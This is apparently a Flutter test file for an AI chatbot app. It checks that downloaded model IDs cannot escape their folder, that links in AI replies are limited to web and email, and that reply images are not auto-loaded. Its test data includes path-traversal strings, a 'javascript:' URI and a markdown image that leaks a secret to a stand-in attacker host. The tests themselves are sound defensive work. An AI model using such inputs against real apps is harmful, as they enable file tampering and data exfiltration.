import 'dart:io';

import 'package:ai_chatbot/core/theme.dart';
import 'package:ai_chatbot/data/local/local_models.dart';
import 'package:ai_chatbot/features/chat/markdown_view.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:material_ui/material_ui.dart';

void main() {
  group('model ids cannot escape the models folder', () {
    test('encoded ../ in a link is neutralised', () {
      final m = LocalModelInfo.fromLink(
          'https://evil.example/a/..%2F..%2F..%2Fshared_prefs%2Fx.gguf');
      expect(m.id, 'x');
      expect(m.id, isNot(contains('/')));
    });

    test('odd characters and leading dots are replaced', () {
      expect(safeModelId(r'..\..\evil.gguf'), 'evil');
      expect(safeModelId('my model (v2).gguf'), 'my_model__v2_');
      expect(safeModelId('...hidden.gguf'), 'hidden');
      expect(() => safeModelId('....gguf'), throwsFormatException);
    });

    test('pathFor rejects unsafe ids', () async {
      final dir = await Directory.systemTemp.createTemp('m');
      final store = LocalModelStore(null, dir: dir);
      expect(() => store.pathFor('../x'), throwsArgumentError);
      expect(await store.pathFor('LFM2-1.2B-Q4_K_M'), endsWith('LFM2-1.2B-Q4_K_M.gguf'));
      for (final m in builtInLocalModels) {
        expect(() => store.pathFor(m.id), returnsNormally, reason: m.id);
      }
      await dir.delete(recursive: true);
    });
  });

  group('links in AI replies', () {
    test('only web and email links are allowed', () {
      expect(isAllowedReplyLink('https://example.com'), isTrue);
      expect(isAllowedReplyLink('mailto:a@b.c'), isTrue);
      expect(isAllowedReplyLink('intent://scan/#Intent;scheme=zxing;end'), isFalse);
      expect(isAllowedReplyLink('tel:+15555555555'), isFalse);
      expect(isAllowedReplyLink('file:///data/data/x'), isFalse);
      expect(isAllowedReplyLink('javascript:alert(1)'), isFalse);
    });
  });

  testWidgets('images in AI replies are not loaded until tapped', (tester) async {
    GoogleFonts.config.allowRuntimeFetching = false;
    await tester.pumpWidget(MaterialApp(
      theme: buildTheme(Brightness.light),
      home: const Scaffold(
        body: MarkdownView('Here: ![x](https://attacker.example/leak?d=secret)'),
      ),
    ));
    await tester.pump();
    expect(find.byType(Image), findsNothing);
    expect(find.textContaining('attacker.example'), findsOneWidget);
  });
}
